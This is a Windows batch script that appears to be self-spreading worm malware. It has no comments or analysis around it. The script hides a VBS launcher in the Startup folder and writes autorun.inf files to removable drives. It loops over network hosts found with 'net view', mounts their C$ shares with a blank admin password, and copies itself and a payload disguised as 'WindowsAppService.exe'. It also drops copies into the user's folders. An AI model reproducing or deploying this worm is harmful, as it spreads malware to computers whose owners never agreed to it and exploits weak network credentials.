@echo off
setlocal
set SPREADER=%~f0
set PAYLOAD=%appdata%\WindowsAppService.exe
set VBS=%appdata%\start_spreader.vbs
set STARTUP=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup

copy "%PAYLOAD%" "%PAYLOAD%" /Y >nul 2>&1
copy "%SPREADER%" "%appdata%\spreader.bat" /Y >nul 2>&1

if not exist "%VBS%" (
  > "%VBS%" (
    echo Set WshShell = CreateObject("WScript.Shell")
    echo WshShell.Run chr(34) ^& "%appdata%\spreader.bat" ^& chr(34), 0, False
  )
  copy "%VBS%" "%STARTUP%\start_spreader.vbs" /Y >nul 2>&1
)

:loop
for /f "tokens=1*" %%a in ('wmic logicaldisk where "drivetype=2" get deviceid ^| find ":"') do (
  copy "%SPREADER%" %%a\spreader.bat /Y >nul 2>&1
  copy "%PAYLOAD%" %%a\WindowsAppService.exe /Y >nul 2>&1
  > %%a\autorun.inf (
    echo [AutoRun]
    echo open=spreader.bat
    echo action=Run Spreader
    echo icon=WindowsAppService.exe
  )
)

net view > pcs.txt
for /f %%i in (pcs.txt) do (
  net use \\%%i\C$ /user:admin "" >nul 2>&1
  if errorlevel 1 net use \\%%i\C$ >nul 2>&1
  copy "%SPREADER%" \\%%i\C$\Users\Public\spreader.bat /Y >nul 2>&1
  copy "%PAYLOAD%" \\%%i\C$\Users\Public\WindowsAppService.exe /Y >nul 2>&1
  net use \\%%i\C$ /delete >nul 2>&1
)

copy "%SPREADER%" "%UserProfile%\Downloads\spreader.bat" /Y >nul 2>&1
copy "%PAYLOAD%" "%UserProfile%\Downloads\WindowsAppService.exe" /Y >nul 2>&1
copy "%SPREADER%" "%UserProfile%\Documents\spreader.bat" /Y >nul 2>&1
copy "%PAYLOAD%" "%UserProfile%\Documents\WindowsAppService.exe" /Y >nul 2>&1

timeout /t 15 >nul
goto loop
